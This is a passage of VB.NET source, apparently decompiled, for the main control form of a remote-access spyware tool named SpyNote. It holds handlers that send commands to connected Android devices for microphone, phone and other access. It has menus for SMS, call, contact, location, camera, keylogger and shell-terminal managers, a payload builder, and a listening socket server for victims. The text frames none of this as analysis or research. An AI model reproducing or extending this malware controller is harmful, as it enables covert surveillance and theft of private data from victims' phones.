                If (tag IsNot Nothing) Then
                    tag.Send(Store.BFF(Store.buff, CLng(22)))
                End If
            End While
        Finally
        End Try
    End Sub

    Private Sub LogsToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles LogsToolStripMenuItem.Click
        If (Me.SplitContainer2.Panel2Collapsed) Then
            Me.SplitContainer2.Panel2Collapsed = False
        End If
        If (Not Me.MTabControl.TabPages.Contains(Me.TabPageConnectionLogs)) Then
            Me.MTabControl.TabPages.Insert(0, Me.TabPageConnectionLogs)
            Me.LabelText.TxText = Me.MTabControl.TabPages(0).Text
            Me.LogsToolStripMenuItem.Checked = True
            Me.LogsToolStripMenuItem.Tag = "Checked"
            Me.MTabControl.SelectTab(0)
            Me.DataGridView1.Focus()
        End If
        Me.PNLTEXT.Invalidate()
        Me.Refresh()
    End Sub

    Private Sub MainSpyNote_Activated(ByVal sender As Object, ByVal e As EventArgs) Handles Me.Activated
        If (Me.MySplitX IsNot Nothing) Then
            Me.MySplitX.Close()
        End If
        If (Me.MySplity IsNot Nothing) Then
            Me.MySplity.Close()
        End If
    End Sub

    Private Sub MainSpyNote_Closing(ByVal sender As Object, ByVal e As CancelEventArgs) Handles Me.Closing
        MyBase.Opacity = 0
        Try
            Try
                Dim str As String = Nothing
                Dim str1 As String = Nothing
                str1 = If(Not Conversions.ToBoolean(Operators.AndObject(Me.LogsToolStripMenuItem.Checked, Operators.NotObject(Operators.CompareObjectEqual(Me.LogsToolStripMenuItem.Tag, Nothing, False)))), String.Concat(str1, "0"), String.Concat(str1, "1"))
                str1 = If(Not Conversions.ToBoolean(Operators.AndObject(Me.BlackListToolStripMenuItem.Checked, Operators.NotObject(Operators.CompareObjectEqual(Me.BlackListToolStripMenuItem.Tag, Nothing, False)))), String.Concat(str1, "0"), String.Concat(str1, "1"))
                str1 = If(Not Conversions.ToBoolean(Operators.AndObject(Me.MonitorAndroidToolStripMenuItem.Checked, Operators.NotObject(Operators.CompareObjectEqual(Me.MonitorAndroidToolStripMenuItem.Tag, Nothing, False)))), String.Concat(str1, "0"), String.Concat(str1, "1"))
                str1 = If(Not Conversions.ToBoolean(Operators.AndObject(Me.InformationsToolStripMenuItem.Checked, Operators.NotObject(Operators.CompareObjectEqual(Me.InformationsToolStripMenuItem.Tag, Nothing, False)))), String.Concat(str1, "0"), String.Concat(str1, "1"))
                str1 = If(Not Conversions.ToBoolean(Operators.AndObject(Me.OnLoginShowAlertToolStripMenuItem.Checked, Operators.NotObject(Operators.CompareObjectEqual(Me.OnLoginShowAlertToolStripMenuItem.Tag, Nothing, False)))), String.Concat(str1, "0"), String.Concat(str1, "1"))
                Me.SpyXml.Edit("value", 4, str1)
                str = If(Not Operators.ConditionalCompareObjectEqual(Me.Bdown0.Tag, "down", False), String.Concat(str, "0"), String.Concat(str, "1"))
                str = If(Not Operators.ConditionalCompareObjectEqual(Me.BAutoDelete0.Tag, "AutoDelete", False), String.Concat(str, "0"), String.Concat(str, "1"))
                str = If(Not Operators.ConditionalCompareObjectEqual(Me.Bdown1.Tag, "down", False), String.Concat(str, "0"), String.Concat(str, "1"))
                str = If(Not Operators.ConditionalCompareObjectEqual(Me.Bdown2.Tag, "down", False), String.Concat(str, "0"), String.Concat(str, "1"))
                str = If(Not Operators.ConditionalCompareObjectEqual(Me.BAutoDelete1.Tag, "AutoDelete", False), String.Concat(str, "0"), String.Concat(str, "1"))
                Me.SpyXml.Edit("value", 5, str)
                Application.ExitThread()
                If (Data.PublicPID <> -1) Then
                    Store.FindPID(Data.PublicPID)
                End If
                If (Me.PublicPID <> -1) Then
                    Store.FindPID(Me.PublicPID)
                End If
                Store.StopThread_0()
                ProjectData.EndApp()
            Catch exception As System.Exception
            End Try
        Finally
            ProjectData.EndApp()
        End Try
    End Sub
    Private Sub MainSpyNote_Load(ByVal sender As Object, ByVal e As EventArgs) Handles Me.Load
        Try
            Me.SplitContainer1.FixedPanel = FixedPanel.Panel2
            Me.SplitContainer2.FixedPanel = FixedPanel.Panel2
            MyBase.Icon = New Icon(Store.Resources(1) + "\Icons\window\win\0.ico")
            ContextRicBox.Menu_Items()
            ContextTextView.Menu_Items()
            ContextGriedView.Menu_Items()
            Me.TTextAddress.HTBTB.ContextMenuStrip = ContextTextView.ContextMenuContextTextView
            Me.DataBlackListView.ContextMenuStrip = ContextGriedView.ContextMenuContextGriedView
            Me.DataLogsView.ContextMenuStrip = ContextGriedView.ContextMenuContextGriedView
            Me.DataMonitorAndroidView.ContextMenuStrip = ContextGriedView.ContextMenuContextGriedView
            Me.PView.ContextMenuStrip = ContextGriedView.ContextMenuContextGriedView
            Me.NView.ContextMenuStrip = ContextGriedView.ContextMenuContextGriedView
            Me.GView.ContextMenuStrip = ContextGriedView.ContextMenuContextGriedView
            Me.ContextControl.Renderer = New ThemeToolStrip()
            Me.ContextTools.Renderer = New ThemeToolStrip()
            Me.MenuStrip1.Renderer = New ThemeToolStrip()
            Me.ContextView.Renderer = New ThemeToolStrip()
            Me.SELCT_Apks.Renderer = New ThemeToolStrip()
            CType(Me.HelpToolStripMenuItem.DropDown, ToolStripDropDownMenu).ShowImageMargin = False
            CType(Me.HelpToolStripMenuItem.DropDown, ToolStripDropDownMenu).BackColor = Me.ContextTools.BackColor
            CType(Me.FoldersToolStripMenuItem.DropDown, ToolStripDropDownMenu).ShowImageMargin = False
            CType(Me.FoldersToolStripMenuItem.DropDown, ToolStripDropDownMenu).BackColor = Me.ContextTools.BackColor
            CType(Me.ScommandToolStripMenuItem.DropDown, ToolStripDropDownMenu).ShowImageMargin = False
            CType(Me.ScommandToolStripMenuItem.DropDown, ToolStripDropDownMenu).BackColor = Me.ContextTools.BackColor
            CType(Me.WndToolStripMenuItem.DropDown, ToolStripDropDownMenu).ShowImageMargin = False
            CType(Me.WndToolStripMenuItem.DropDown, ToolStripDropDownMenu).BackColor = Me.ContextTools.BackColor
            CType(Me.EdweToolStripMenuItem.DropDown, ToolStripDropDownMenu).ShowImageMargin = False
            CType(Me.EdweToolStripMenuItem.DropDown, ToolStripDropDownMenu).BackColor = Me.ContextTools.BackColor
            CType(Me.SdsafdToolStripMenuItem.DropDown, ToolStripDropDownMenu).ShowImageMargin = False
            CType(Me.SdsafdToolStripMenuItem.DropDown, ToolStripDropDownMenu).BackColor = Me.ContextTools.BackColor
            CType(Me.CleintTCPToolStripMenuItem.DropDown, ToolStripDropDownMenu).ShowImageMargin = False
            CType(Me.CleintTCPToolStripMenuItem.DropDown, ToolStripDropDownMenu).BackColor = Me.ContextTools.BackColor
            Me.ToolTip_0._ToolTip.SetToolTip(Me.MaximTab, "Maximized")
            Me.ToolTip_0._ToolTip.SetToolTip(Me.CloseTab, "Close")
            Me.ToolTip_1._ToolTip.SetToolTip(Me.Closeinformations, "Close")
            Me.ToolTip_2._ToolTip.SetToolTip(Me.Bdown0, "Scroll to the end")
            Me.ToolTip_2._ToolTip.SetToolTip(Me.BDelete0, "Delete selected item")
            Me.ToolTip_2._ToolTip.SetToolTip(Me.BDeleteAll0, "Delete all items")
            Me.ToolTip_2._ToolTip.SetToolTip(Me.BAutoDelete0, "Auto Delete items")
            Me.ToolTip_3._ToolTip.SetToolTip(Me.Bdown1, "Scroll to the end")
            Me.ToolTip_3._ToolTip.SetToolTip(Me.BDelete1, "Delete selected item")
            Me.ToolTip_3._ToolTip.SetToolTip(Me.BRefres0, "Refresh")
            Me.ToolTip_3._ToolTip.SetToolTip(Me.BDeleteAll1, "Delete all items")
            Me.ToolTip_3._ToolTip.SetToolTip(Me.BADD0, "Add")
            Me.ToolTip_4._ToolTip.SetToolTip(Me.Bdown2, "Scroll to the end")
            Me.ToolTip_4._ToolTip.SetToolTip(Me.BDelete2, "Delete selected item")
            Me.ToolTip_4._ToolTip.SetToolTip(Me.BDeleteAll2, "Delete all items")
            Me.ToolTip_4._ToolTip.SetToolTip(Me.BAutoDelete1, "Auto Delete items")
            ThreadPool.SetMinThreads(250, 250)
            ThreadPool.SetMaxThreads(250, 250)
            Me.PView.Rows.Add(New Object() {Me.NothingBitmap, "Online", "n/a"})
            Me.PView.Rows.Add(New Object() {Me.NothingBitmap, "Connections", "n/a"})
            Me.PView.Rows.Add(New Object() {Me.NothingBitmap, "Request Data", "n/a"})
            Me.PView.Rows.Add(New Object() {Me.NothingBitmap, "Received Data ", "n/a"})
            Me.PView.Rows.Add(New Object() {Me.NothingBitmap, "Sent Data", "n/a"})
            Me.PView.Rows.Add(New Object() {Me.NothingBitmap, "Port", "n/a"})
            Me.PView.Rows.Add(New Object() {Me.NothingBitmap, "Address", "n/a"})
            Me.PView.Rows.Add(New Object() {Me.NothingBitmap, "Password", "n/a"})
            Me.PView.Rows.Add(New Object() {Me.NothingBitmap, "DDoS Protection", "n/a"})
            Dim num As Integer = Me.PView.Rows.Count - 1
            For i As Integer = 0 To num
                Me.PView.Rows(i).Cells(0).Value = My.Resources.Circle
            Next
            Me.PNL1.Tag = Conversions.ToString(Me.PView.Rows(0).Height * Me.PView.Rows.Count + 30)
            Me.xPNL1 = Me.PNL1.Size.Height
            Me.NView.Rows.Add(New Object() {Me.NothingBitmap, "HostName", "n/a"})
            Me.NView.Rows.Add(New Object() {Me.NothingBitmap, "LocalIP", "n/a"})
            Me.NView.Rows.Add(New Object() {Me.NothingBitmap, "Download", "n/a"})
            Me.NView.Rows.Add(New Object() {Me.NothingBitmap, "Upload", "n/a"})
            Me.NView.Rows.Add(New Object() {Me.NothingBitmap, "Interface type", "n/a"})
            Me.NView.Rows.Add(New Object() {Me.NothingBitmap, "MAC-Addres", "n/a"})
            Me.NView.Rows.Add(New Object() {Me.NothingBitmap, "Network Status", "n/a"})
            Me.NView.Rows.Add(New Object() {Me.NothingBitmap, "Network Multicast", "n/a"})
            Me.NView.Rows.Add(New Object() {Me.NothingBitmap, "Speed", "n/a"})
            Me.NView.Rows.Add(New Object() {Me.NothingBitmap, "Network Name", "n/a"})
            Dim num2 As Integer = Me.NView.Rows.Count - 1
            For j As Integer = 0 To num2
                Me.NView.Rows(j).Cells(0).Value = My.Resources.Circle
            Next
            Me.PNL2.Tag = Conversions.ToString(Me.NView.Rows(0).Height * Me.NView.Rows.Count + 30)
            Me.xPNL2 = Me.PNL2.Size.Height
            Me.GView.Rows.Add(New Object() {Me.NothingBitmap, "StartTime", "n/a"})
            Me.GView.Rows.Add(New Object() {Me.NothingBitmap, "Threads", "n/a"})
            Me.GView.Rows.Add(New Object() {Me.NothingBitmap, "CPU Usage", "n/a"})
            Me.GView.Rows.Add(New Object() {Me.NothingBitmap, "Mem(Private Bytes)", "n/a"})
            Me.GView.Rows.Add(New Object() {Me.NothingBitmap, "Mem(Working Set)", "n/a"})
            Dim num3 As Integer = Me.GView.Rows.Count - 1
            For k As Integer = 0 To num3
                Me.GView.Rows(k).Cells(0).Value = My.Resources.Circle
            Next
            Me.PNL3.Tag = Conversions.ToString(Me.GView.Rows(0).Height * Me.GView.Rows.Count + 30)
            Me.xPNL3 = Me.PNL3.Size.Height
        Catch ex As Exception
            Interaction.MsgBox(ex.Message, MsgBoxStyle.Exclamation, Store.Resources(0))
        End Try
        Try
            Me.SpyXml = New XMLSettings()
            Me.SpyXml.LoadXML()
            Store.LoadNic()
            Dim text As String = Me.SpyXml.Reading("value", 4).Trim().ToString()
            Dim text2 As String = Me.SpyXml.Reading("value", 5).Trim().ToString()
            Try
                Dim flag As Boolean = Operators.CompareString(Conversions.ToString(text(0)), "1", False) <> 0
                If flag Then
                    Me.LogsToolStripMenuItem.Checked = False
                    Me.LogsToolStripMenuItem.Tag = Nothing
                    Try
                        For Each obj As Object In Me.MTabControl.TabPages
                            Dim objectValue As Object = RuntimeHelpers.GetObjectValue(obj)
                            Dim flag2 As Boolean = Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(objectValue, Nothing, "name", New Object(-1) {}, Nothing, Nothing, Nothing), "TabPageConnectionLogs", False)
                            If flag2 Then
                                Me.MTabControl.TabPages.Remove(CType(objectValue, TabPage))
                            End If
                        Next
                    Finally
                    End Try
                End If
                Dim flag3 As Boolean = Operators.CompareString(Conversions.ToString(text(1)), "1", False) <> 0
                If flag3 Then
                    Me.BlackListToolStripMenuItem.Checked = False
                    Me.BlackListToolStripMenuItem.Tag = Nothing
                    Try
                        For Each obj2 As Object In Me.MTabControl.TabPages
                            Dim objectValue2 As Object = RuntimeHelpers.GetObjectValue(obj2)
                            Dim flag4 As Boolean = Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(objectValue2, Nothing, "name", New Object(-1) {}, Nothing, Nothing, Nothing), "TabPageBlackList", False)
                            If flag4 Then
                                Me.MTabControl.TabPages.Remove(CType(objectValue2, TabPage))
                            End If
                        Next
                    Finally
                    End Try
                End If
                Dim flag5 As Boolean = Operators.CompareString(Conversions.ToString(text(2)), "1", False) <> 0
                If flag5 Then
                    Me.MonitorAndroidToolStripMenuItem.Checked = False
                    Me.MonitorAndroidToolStripMenuItem.Tag = Nothing
                    Try
                        For Each obj3 As Object In Me.MTabControl.TabPages
                            Dim objectValue3 As Object = RuntimeHelpers.GetObjectValue(obj3)
                            Dim flag6 As Boolean = Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(objectValue3, Nothing, "name", New Object(-1) {}, Nothing, Nothing, Nothing), "TabPageMonitorAndroid", False)
                            If flag6 Then
                                Me.MTabControl.TabPages.Remove(CType(objectValue3, TabPage))
                            End If
                        Next
                    Finally
                    End Try
                End If
                Dim flag7 As Boolean = Operators.CompareString(Conversions.ToString(text(3)), "1", False) <> 0
                If flag7 Then
                    Me.InformationsToolStripMenuItem.Checked = False
                    Me.InformationsToolStripMenuItem.Tag = Nothing
                    Me.SplitContainer1.Panel2Collapsed = True
                End If
                Dim flag8 As Boolean = Operators.CompareString(Conversions.ToString(text(4)), "1", False) <> 0
                If flag8 Then
                    Me.OnLoginShowAlertToolStripMenuItem.Checked = False
                    Me.OnLoginShowAlertToolStripMenuItem.Tag = Nothing
                End If
                Dim flag9 As Boolean = Me.MTabControl.TabPages.Count <= 0
                If flag9 Then
                    Dim flag10 As Boolean = Not Me.SplitContainer2.Panel2Collapsed
                    If flag10 Then
                        Me.SplitContainer2.Panel2Collapsed = True
                    End If
                End If
                Dim flag11 As Boolean = Operators.CompareString(Conversions.ToString(text2(0)), "1", False) = 0
                If flag11 Then
                    Me.Bdown0.Tag = "down"
                    Me.Bdown0.backColorNone0 = Color.FromArgb(78, 201, 148)
                    Me.Bdown0.backColorNone1 = Color.FromArgb(78, 201, 148)
                End If
                Dim flag12 As Boolean = Operators.CompareString(Conversions.ToString(text2(1)), "1", False) = 0
                If flag12 Then
                    Me.BAutoDelete0.Tag = "AutoDelete"
                    Me.BAutoDelete0.backColorNone0 = Color.FromArgb(78, 201, 148)
                    Me.BAutoDelete0.backColorNone1 = Color.FromArgb(78, 201, 148)
                End If
                Dim flag13 As Boolean = Operators.CompareString(Conversions.ToString(text2(2)), "1", False) = 0
                If flag13 Then
                    Me.Bdown1.Tag = "down"
                    Me.Bdown1.backColorNone0 = Color.FromArgb(78, 201, 148)
                    Me.Bdown1.backColorNone1 = Color.FromArgb(78, 201, 148)
                End If
                Dim flag14 As Boolean = Operators.CompareString(Conversions.ToString(text2(3)), "1", False) = 0
                If flag14 Then
                    Me.Bdown2.Tag = "down"
                    Me.Bdown2.backColorNone0 = Color.FromArgb(78, 201, 148)
                    Me.Bdown2.backColorNone1 = Color.FromArgb(78, 201, 148)
                End If
                Dim flag15 As Boolean = Operators.CompareString(Conversions.ToString(text2(4)), "1", False) = 0
                If flag15 Then
                    Me.BAutoDelete1.Tag = "AutoDelete"
                    Me.BAutoDelete1.backColorNone0 = Color.FromArgb(78, 201, 148)
                    Me.BAutoDelete1.backColorNone1 = Color.FromArgb(78, 201, 148)
                End If
            Catch ex2 As Exception
            End Try
            Dim path As String = Store.Resources(1) + "\Imports\opt.inf"
            Data.OptionsLines = File.ReadAllLines(path)
            Me.Bdown0.ImageChoice = Store.Bitmap_0("ToolStrip\Down")
            Me.Bdown0.ShowImage = True
            Me.BDelete0.ImageChoice = Store.Bitmap_0("ToolStrip\Delete")
            Me.BDelete0.ShowImage = True
            Me.Bdown1.ImageChoice = Store.Bitmap_0("ToolStrip\Down")
            Me.Bdown1.ShowImage = True
            Me.BDelete1.ImageChoice = Store.Bitmap_0("ToolStrip\Delete")
            Me.BDelete1.ShowImage = True
            Me.BRefres0.ImageChoice = Store.Bitmap_0("ToolStrip\Refresh")
            Me.BRefres0.ShowImage = True
            Me.BADD0.ImageChoice = Store.Bitmap_0("ToolStrip\Add")
            Me.BADD0.ShowImage = True
            Me.BDeleteAll0.ImageChoice = Store.Bitmap_0("ToolStrip\DeleteAll")
            Me.BDeleteAll0.ShowImage = True
            Me.BDeleteAll1.ImageChoice = Store.Bitmap_0("ToolStrip\DeleteAll")
            Me.BDeleteAll1.ShowImage = True
            Me.BAutoDelete0.ImageChoice = Store.Bitmap_0("ToolStrip\AutoDelete")
            Me.BAutoDelete0.ShowImage = True
            Me.Bdown2.ImageChoice = Store.Bitmap_0("ToolStrip\Down")
            Me.Bdown2.ShowImage = True
            Me.BDelete2.ImageChoice = Store.Bitmap_0("ToolStrip\Delete")
            Me.BDelete2.ShowImage = True
            Me.BDeleteAll2.ImageChoice = Store.Bitmap_0("ToolStrip\DeleteAll")
            Me.BDeleteAll2.ShowImage = True
            Me.BAutoDelete1.ImageChoice = Store.Bitmap_0("ToolStrip\AutoDelete")
            Me.BAutoDelete1.ShowImage = True
            Me.FileManagerToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
            Me.FileManagerToolStripMenuItem.Image = Store.Bitmap_0("ctx_menu\f")
            Me.SMSManagerToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
            Me.SMSManagerToolStripMenuItem.Image = Store.Bitmap_0("ctx_menu\s")
            Me.CallsManagerToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
            Me.CallsManagerToolStripMenuItem.Image = Store.Bitmap_0("ctx_menu\c")
            Me.ContactsManagerToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
            Me.ContactsManagerToolStripMenuItem.Image = Store.Bitmap_0("ctx_menu\b")
            Me.LocationManagerToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
            Me.LocationManagerToolStripMenuItem.Image = Store.Bitmap_0("ctx_menu\loc")
            Me.AccountManagerToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
            Me.AccountManagerToolStripMenuItem.Image = Store.Bitmap_0("ctx_menu\acc")
            Me.CameraManagerToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
            Me.CameraManagerToolStripMenuItem.Image = Store.Bitmap_0("ctx_menu\ca")
            Me.ShellTerminalToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
            Me.ShellTerminalToolStripMenuItem.Image = Store.Bitmap_0("ctx_menu\t")
            Me.ApplicationsToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
            Me.ApplicationsToolStripMenuItem.Image = Store.Bitmap_0("ctx_menu\prg")
            Me.MicrophoneToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
            Me.MicrophoneToolStripMenuItem.Image = Store.Bitmap_0("ctx_menu\mc")
            Me.KeyloggerToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
            Me.KeyloggerToolStripMenuItem.Image = Store.Bitmap_0("ctx_menu\k")
            Me.SettingsToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
            Me.SettingsToolStripMenuItem.Image = Store.Bitmap_0("ctx_menu\set")
            Me.PhoneToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
            Me.PhoneToolStripMenuItem.Image = Store.Bitmap_0("ctx_menu\ph")
            Me.ChatToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
            Me.ChatToolStripMenuItem.Image = Store.Bitmap_0("ctx_menu\ch")
            Me.CloseTab.Image = Store.Bitmap_0("window\w2")
            Me.MaximTab.Image = Store.Bitmap_0("window\w0")
            Me.Closeinformations.Image = Store.Bitmap_0("window\w2")
            Me.FunToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
            Me.FunToolStripMenuItem.Image = Store.Bitmap_0("ctx_menu\fun")
            Me.CleintTCPToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None
            Me.CleintTCPToolStripMenuItem.Image = Store.Bitmap_0("ctx_menu\v")
            Dim flag16 As Boolean = False
            Dim files As String() = Directory.GetFiles(Store.Resources(1) + "\Icons\Flags")
            For Each text3 As String In files
                Dim flag17 As Boolean = Not flag16
                If flag17 Then
                    Me.imageList_Flags.ImageSize = New Size(Image.FromFile(text3).Size.Width, Image.FromFile(text3).Size.Height)
                    Me.imageList_Flags.ColorDepth = ColorDepth.Depth32Bit
                    flag16 = True
                End If
                Dim path2 As String = text3
                Dim fileNameWithoutExtension As String = IO.Path.GetFileNameWithoutExtension(path2)
                Me.imageList_Flags.Images.Add(fileNameWithoutExtension.ToUpper(), Image.FromFile(text3))
            Next
            MyBase.Show()
            Data.nNotice.Show()
            Me.DownPNL.Enabled = True
            Me.TScrolls.Interval = Store.TScrollsInterval
            Dim flag18 As Boolean = MyBase.Opacity <> 1.0
            If flag18 Then
                Me.Trans.Enabled = True
            End If
            Dim selectPort As SelectPort
            While True
                selectPort = New SelectPort()
                Dim dialogResult As DialogResult = selectPort.ShowDialog(Me)
                If dialogResult <> DialogResult.OK Then
                    Exit While
                End If
                Try
                    Me.Socket = New SocketServer(Conversions.ToInteger(NewLateBinding.LateGet(selectPort.PView.Rows(0).Cells(2).Value, Nothing, "Trim", New Object(-1) {}, Nothing, Nothing, Nothing)))
                    Me.PView.Rows(5).Cells(2).Value = CType(Me.Socket.Listener.LocalEndpoint, IPEndPoint).Port.ToString()
                    Me.PView.Rows(6).Cells(2).Value = CType(Me.Socket.Listener.LocalEndpoint, IPEndPoint).Address.ToString()
                    Me.PView.Rows(7).Cells(2).Value = If(Operators.ConditionalCompareObjectEqual(selectPort.PView.Rows(1).Cells(3).Tag, "False", False), Conversions.ToString(False), Conversions.ToString(True))
                    Me.PView.Rows(8).Cells(2).Value = If(Operators.ConditionalCompareObjectEqual(selectPort.PView.Rows(2).Cells(3).Tag, "False", False), "Off", "On")
                    Dim flag19 As Boolean = Operators.ConditionalCompareObjectEqual(selectPort.PView.Rows(2).Cells(3).Tag, "False", False)
                    If flag19 Then
                        Me.PView.Rows(8).Cells(2).Style.ForeColor = Color.FromArgb(255, 128, 128)
                        Me.PView.Rows(8).Cells(2).Style.SelectionForeColor = Color.FromArgb(255, 128, 128)
                    Else
                        Me.PView.Rows(8).Cells(2).Style.ForeColor = Color.FromArgb(78, 201, 176)
                        Me.PView.Rows(8).Cells(2).Style.SelectionForeColor = Color.FromArgb(78, 201, 176)
                    End If
                    Dim flag20 As Boolean = Operators.ConditionalCompareObjectEqual(selectPort.PView.Rows(1).Cells(3).Tag, "False", False)
                    If flag20 Then
                        Me.PView.Rows(7).Cells(2).Style.ForeColor = Color.FromArgb(255, 128, 128)
                        Me.PView.Rows(7).Cells(2).Style.SelectionForeColor = Color.FromArgb(255, 128, 128)
                    Else
                        Me.PView.Rows(7).Cells(2).Style.ForeColor = Color.FromArgb(78, 201, 176)
                        Me.PView.Rows(7).Cells(2).Style.SelectionForeColor = Color.FromArgb(78, 201, 176)
                    End If
                    selectPort.Close()
                    Me.UpdateLabels.Enabled = True
                    Store.StartThread_0()
                    Me.ContinueTrans = True
                Catch ex3 As Exception
                    Interaction.MsgBox(ex3.Message, MsgBoxStyle.Exclamation, Store.Resources(0))
                    selectPort.Close()
                    Continue While
                End Try
                GoTo IL_1A67
            End While
            selectPort.Close()
            MyBase.Close()
IL_1A67:
            Dim flag21 As Boolean = Conversions.ToBoolean(Me.SpyXml.Reading("value", 1).Trim().ToString())
            Dim pass As String = Me.SpyXml.Reading("value", 3).Trim().ToString()
            Data.BoolPass = flag21
            Dim flag22 As Boolean = Not flag21
            If flag22 Then
                Data.Pass = "null"
            Else
                Data.Pass = pass
            End If
        Catch ex4 As Exception
            Me.DownPNL.Enabled = True
            Interaction.MsgBox(ex4.Message, MsgBoxStyle.Exclamation, Store.Resources(0))
            ProjectData.EndApp()
        End Try
        Me.Refresh()
        Me.SplitContainer1.Invalidate()
        Me.SplitContainer2.Invalidate()
    End Sub

    Private Sub MainSpyNote_ResizeBegin(ByVal sender As Object, ByVal e As EventArgs) Handles Me.ResizeBegin
        MyBase.SuspendLayout()
    End Sub

    Private Sub MainSpyNote_ResizeEnd(ByVal sender As Object, ByVal e As EventArgs) Handles Me.ResizeEnd
        MyBase.ResumeLayout()
        Me.Refresh()
    End Sub

    Private Sub MaximTab_MouseHover(ByVal sender As Object, ByVal e As EventArgs) Handles MaximTab.MouseHover
        If (Not Me.SplitContainer2.Panel1Collapsed) Then
            Me.MaximTab.Image = Store.Bitmap_0("window\ww0")
        Else
            Me.MaximTab.Image = Store.Bitmap_0("window\ww1")
        End If
    End Sub

    Private Sub MaximTab_MouseLeave(ByVal sender As Object, ByVal e As EventArgs) Handles MaximTab.MouseLeave
        If (Not Me.SplitContainer2.Panel1Collapsed) Then
            Me.MaximTab.Image = Store.Bitmap_0("window\w0")
        Else
            Me.MaximTab.Image = Store.Bitmap_0("window\w1")
        End If
    End Sub

    Private Sub MicrophoneToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles MicrophoneToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = Me.DataGridView1.SelectedRows.GetEnumerator()
            While enumerator.MoveNext()
                Dim tag As SocketClient = DirectCast(DirectCast(enumerator.Current, DataGridViewRow).Tag, SocketClient)
                If (tag IsNot Nothing) Then
                    tag.Send(Store.BFF(Store.buff, CLng(8)))
                End If
            End While
        Finally
        End Try
    End Sub

    Private Sub MonitorToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles MonitorAndroidToolStripMenuItem.Click
        Try
            If (Me.SplitContainer2.Panel2Collapsed) Then
                Me.SplitContainer2.Panel2Collapsed = False
            End If
            If (Not Me.MTabControl.TabPages.Contains(Me.TabPageMonitorAndroid)) Then
                Me.MTabControl.TabPages.Insert(0, Me.TabPageMonitorAndroid)
                Me.LabelText.TxText = Me.MTabControl.TabPages(0).Text
                Me.MonitorAndroidToolStripMenuItem.Checked = True
                Me.MonitorAndroidToolStripMenuItem.Tag = "Checked"
                Me.MTabControl.SelectTab(0)
                Me.DataGridView1.Focus()
            End If
            Me.PNLTEXT.Invalidate()
            Me.Refresh()
        Catch ex As Exception

        End Try

    End Sub

    Private Sub NView_CellEnter(ByVal sender As Object, ByVal e As DataGridViewCellEventArgs) Handles NView.CellEnter
        Me.PView.ClearSelection()
        Me.GView.ClearSelection()
    End Sub

    Private Sub OnLoginShowAlertToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles OnLoginShowAlertToolStripMenuItem.Click
        If (Not Me.OnLoginShowAlertToolStripMenuItem.Checked) Then
            Me.OnLoginShowAlertToolStripMenuItem.Checked = True
            Me.OnLoginShowAlertToolStripMenuItem.Tag = "Checked"
        Else
            Me.OnLoginShowAlertToolStripMenuItem.Checked = False
            Me.OnLoginShowAlertToolStripMenuItem.Tag = Nothing
        End If
    End Sub

    Private Sub OptionsToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles OptionsToolStripMenuItem.Click
        My.Forms.fOptions.ShowDialog()
    End Sub

    Private Sub OtherClientFolderToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles OtherClientFolderToolStripMenuItem.Click
        Me._ClientFolder()
    End Sub

    Private Sub PanelMain_MouseWheel(ByVal sender As Object, ByVal e As MouseEventArgs) Handles PanelMain.MouseWheel
        If (e.Delta <= 1) Then
            Dim visualStudioVerticalScrollBar2 As VisualStudioVerticalScrollBar = Me.VisualStudioVerticalScrollBar2
            visualStudioVerticalScrollBar2.Value = visualStudioVerticalScrollBar2.Value + 10
        Else
            Dim value As VisualStudioVerticalScrollBar = Me.VisualStudioVerticalScrollBar2
            value.Value = value.Value - 10
        End If
    End Sub
    Private Sub PayloadToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles PayloadToolStripMenuItem.Click
        Dim build As Build = New Build()
        If (build.ShowDialog(Me) = System.Windows.Forms.DialogResult.OK) Then
            Try
                build.Close()
            Catch exception1 As System.Exception
                MsgBox(exception1.Message, MsgBoxStyle.Exclamation, Store.Resources(0))
                build.Close()
            End Try
        Else
            build.Close()
        End If
    End Sub

    Private Sub PhoneToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles PhoneToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = Me.DataGridView1.SelectedRows.GetEnumerator()
            While enumerator.MoveNext()
                Dim tag As SocketClient = DirectCast(DirectCast(enumerator.Current, DataGridViewRow).Tag, SocketClient)
                If (tag IsNot Nothing) Then
                    tag.Send(String.Concat(Store.BFF(Store.buff, CLng(31)), Data.SplitData))
                End If
            End While
        Finally
        End Try
    End Sub

    Private Sub PictureBox2_Click(ByVal sender As Object, ByVal e As EventArgs) Handles MaximTab.Click
        If (Not Me.SplitContainer2.Panel1Collapsed) Then
            Me.SplitContainer2.Panel1Collapsed = True
            Me.MaximTab.Image = Store.Bitmap_0("window\w1")
            Me.ToolTip_0._ToolTip.SetToolTip(Me.MaximTab, "Minimized")
        Else
            Me.SplitContainer2.Panel1Collapsed = False
            Me.MaximTab.Image = Store.Bitmap_0("window\w0")
            Me.ToolTip_0._ToolTip.SetToolTip(Me.MaximTab, "Maximized")
        End If
    End Sub

